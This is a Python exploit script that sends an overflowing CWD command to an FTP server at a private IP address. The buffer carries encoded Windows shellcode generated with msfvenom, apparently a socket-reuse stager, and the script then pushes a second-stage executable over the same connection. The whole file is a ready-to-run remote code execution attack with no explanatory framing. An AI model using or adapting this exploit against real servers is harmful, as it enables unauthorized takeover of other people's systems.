#!/usr/bin/python
import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# cat stager_reverse_tcp_reuse_oob | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai
# -b "\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
buf = "\xdb\xd1\xba\x3a\x4b\xe1\xc3\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x4c\x83\xc3\x04\x31\x53\x14\x03\x53\x2e\xa9"
buf += "\x14\x19\x8f\x95\x83\xd6\x79\x2c\xf2\x93\xa1\x44\x5b"
buf += "\x77\x60\x15\x21\xb6\x34\x4f\xa9\xfe\xa1\xec\x43\x02"
buf += "\x67\x4f\x34\xdc\x0b\x59\xe1\xab\xaa\x56\xc9\x66\x01"
buf += "\xd7\xa2\xbd\x05\x68\x11\xbd\xf1\x06\xef\x89\x82\x51"
buf += "\x86\x50\x2d\x32\xc9\x79\x9c\x19\x43\x27\x32\x18\x2d"
buf += "\x9a\xd5\x94\x27\x75\x04\x52\x0b\x88\xd1\x03\x6b\xa0"
buf += "\x44\xd5\x77\xce\x0b\x93\x88\x21\x56\x9b\x05\x43\xc1"
buf += "\x48\xe3\x62\xd1\xf6\xd5\x4d\x18\x91\x45\xc5\x4e\xcf"
buf += "\x9b\x3c\xa9\xcd\x9d\x86\x93\xaa\x89\x70\xf3\xc1\x34"
buf += "\x03\x29\x15\x65\x07\x0c\x1d\xe9\x54\xb9\x83\xb6\x50"
buf += "\x67\x2e\xf4\xc9\xd2\x14\x74\x25\xd9\x01\x6d\xc2\xd3"
buf += "\xcc\x94\x64\xa0\x59\x36\x2a\x97\x1c\x78\x3f\x4e\x6d"
buf += "\x49\x93\x0b\x54\x99\x84\x39\xb4\xef\x9f\xe7\x79\xfc"
buf += "\xfd\x34\xa8\x5a\x06\xbc\x47\x96\x86\xcc\x7d\x3f\x86"
buf += "\xb9\xfe\xa9\x27\x9b\x99\x62\xed\x2d\x41\xf7\x29\x39"
buf += "\xd2\x4c\x34\x44\x4b\xf1\x63\x8a\x94\xec\xfd\x83\xeb"
buf += "\x41\x29\x59\x9b\x19\x97\x1e\x75\xb1\x67\xbc\xdd\x8a"
buf += "\x60\x62\xe7\x0b\xdb\x37\x5f\xff\xf4\x21\xee\xf2\xae"
buf += "\x93\xdc\xfe\x26\x3a\x8e\xe1\xbb\x56\x9d\xee\xbb\x06"
buf += "\xb5\x0e\xb0\xbd\xfc\x44\x52\xf9\xf8\x85\x6e\xec\x53"
buf += "\x58\x80\xcc\xd4\x2a\xa4\x37\xd2\xd9\xb0\x4c\x89\x63"
buf += "\x6d\xd9\x1f\x84\x12\x1a\x8d\xe9\xa1\xc8\xfc\xfa\xbe"
buf += "\x09\x56\xf6\xe6\xbe\xda\x89\x30\x9f\xcc\xe9\x93\x7f"
buf += "\x06\x20\x07"

buffer = "\x41" * 1037 + "\xeb\x0a\x90\x90" + "\x9D\x6D\x20\x12" + "\x90" *30 +  buf +  "D"*2032 + "F" * 4751

print "\nsending evil buffer...."

s.connect(('192.168.43.198',21))
data = s.recv(1024)
s.send('USER anonymous' + '\r\nA', socket.MSG_OOB)
data = s.recv(1024)
s.send('PASS anonymous' + '\r\n')
data = s.recv(1024)
s.send('CWD ' +buffer+'\r\n')

with open("msgbox.exe.stage", mode='rb') as file: 
    fileContent = file.read()
s.send(fileContent);
time.sleep(200)
s.close
